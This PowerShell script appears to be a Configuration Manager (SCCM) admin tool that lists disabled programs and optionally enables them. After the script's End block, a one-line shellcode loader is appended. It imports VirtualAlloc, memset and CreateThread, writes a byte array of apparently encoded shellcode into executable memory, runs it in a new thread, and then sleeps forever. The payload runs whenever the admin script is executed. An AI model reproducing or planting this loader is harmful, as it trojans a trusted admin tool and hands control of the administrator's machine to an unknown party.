﻿
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Site server where the SMS Provider is installed")]
    [ValidateNotNullOrEmpty()]
    [string]$SiteServer,
    [parameter(Mandatory=$false, HelpMessage="Enable disabled programs")]
    [switch]$Enable
)
Begin {
    
    try {
        Write-Verbose "Determining SiteCode for Site Server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop -Verbose:$false
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Debug "SiteCode: $($SiteCode)"
            }
        }
    }
    catch [Exception] {
        Throw "Unable to determine SiteCode"
    }
    
    $SiteDrive = $SiteCode + ":"
    
    $CurrentLocation = $PSScriptRoot
    
    Import-Module (Join-Path -Path (($env:SMS_ADMIN_UI_PATH).Substring(0,$env:SMS_ADMIN_UI_PATH.Length-5)) -ChildPath "\ConfigurationManager.psd1" -Verbose:$false) -Force -Verbose:$false
    if ((Get-PSDrive $SiteCode -ErrorAction SilentlyContinue | Measure-Object).Count -ne 1) {
        New-PSDrive -Name $SiteCode -PSProvider "AdminUI.PS.Provider\CMSite" -Root $SiteServer -Verbose:$false
    }
}
Process {
    
    Set-Location $SiteDrive -Verbose:$false
    
    $Programs = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_Program -ComputerName $SiteServer -Verbose:$false
    if ($Programs -ne $null) {
        foreach ($Program in $Programs) {
            if ($Program.ProgramFlags -eq ($Program.ProgramFlags -bor "0x00001000")) {
                $PSObject = [PSCustomObject]@{
                    "PackageName" = $Program.PackageName
                    "ProgramName" = $Program.ProgramName
                }
                if ($PSBoundParameters["Enable"]) {
                    Write-Verbose -Message "Enabling program '$($Program.ProgramName)' for package '$($Program.PackageName)'"
                    try {
                        Get-CMProgram -ProgramName $Program.ProgramName -PackageId $Program.PackageID -Verbose:$false | Enable-CMProgram -Verbose:$false -ErrorAction Stop
                    }
                    catch {
                        Write-Warning -Message "Unable to enable program '$($Program.ProgramName)' for package '$($Program.PackageName)'"
                    }
                }
                else {
                    Write-Output $PSObject
                }
            }
        }
    }
    else {
        Write-Warning -Message "No Programs found"
    }
}
End {
    Set-Location -Path $CurrentLocation
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x05,0x60,0x19,0xbd,0xd9,0xed,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x47,0x83,0xc3,0x04,0x31,0x7b,0x0f,0x03,0x7b,0x0a,0x82,0xec,0x41,0xfc,0xc0,0x0f,0xba,0xfc,0xa4,0x86,0x5f,0xcd,0xe4,0xfd,0x14,0x7d,0xd5,0x76,0x78,0x71,0x9e,0xdb,0x69,0x02,0xd2,0xf3,0x9e,0xa3,0x59,0x22,0x90,0x34,0xf1,0x16,0xb3,0xb6,0x08,0x4b,0x13,0x87,0xc2,0x9e,0x52,0xc0,0x3f,0x52,0x06,0x99,0x34,0xc1,0xb7,0xae,0x01,0xda,0x3c,0xfc,0x84,0x5a,0xa0,0xb4,0xa7,0x4b,0x77,0xcf,0xf1,0x4b,0x79,0x1c,0x8a,0xc5,0x61,0x41,0xb7,0x9c,0x1a,0xb1,0x43,0x1f,0xcb,0x88,0xac,0x8c,0x32,0x25,0x5f,0xcc,0x73,0x81,0x80,0xbb,0x8d,0xf2,0x3d,0xbc,0x49,0x89,0x99,0x49,0x4a,0x29,0x69,0xe9,0xb6,0xc8,0xbe,0x6c,0x3c,0xc6,0x0b,0xfa,0x1a,0xca,0x8a,0x2f,0x11,0xf6,0x07,0xce,0xf6,0x7f,0x53,0xf5,0xd2,0x24,0x07,0x94,0x43,0x80,0xe6,0xa9,0x94,0x6b,0x56,0x0c,0xde,0x81,0x83,0x3d,0xbd,0xcd,0x60,0x0c,0x3e,0x0d,0xef,0x07,0x4d,0x3f,0xb0,0xb3,0xd9,0x73,0x39,0x1a,0x1d,0x74,0x10,0xda,0xb1,0x8b,0x9b,0x1b,0x9b,0x4f,0xcf,0x4b,0xb3,0x66,0x70,0x00,0x43,0x87,0xa5,0xbd,0x46,0x1f,0x2b,0x02,0x40,0xd4,0xdb,0x80,0x52,0xfb,0x47,0x0c,0xb4,0xab,0x27,0x5e,0x69,0x0b,0x98,0x1e,0xd9,0xe3,0xf2,0x90,0x06,0x13,0xfd,0x7a,0x2f,0xb9,0x12,0xd3,0x07,0x55,0x8a,0x7e,0xd3,0xc4,0x53,0x55,0x99,0xc6,0xd8,0x5a,0x5d,0x88,0x28,0x16,0x4d,0x7c,0xd9,0x6d,0x2f,0x2a,0xe6,0x5b,0x5a,0xd2,0x72,0x60,0xcd,0x85,0xea,0x6a,0x28,0xe1,0xb4,0x95,0x1f,0x7a,0x7c,0x00,0xe0,0x14,0x81,0xc4,0xe0,0xe4,0xd7,0x8e,0xe0,0x8c,0x8f,0xea,0xb2,0xa9,0xcf,0x26,0xa7,0x62,0x5a,0xc9,0x9e,0xd7,0xcd,0xa1,0x1c,0x0e,0x39,0x6e,0xde,0x65,0xbb,0x52,0x09,0x43,0xc9,0xba,0x89;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

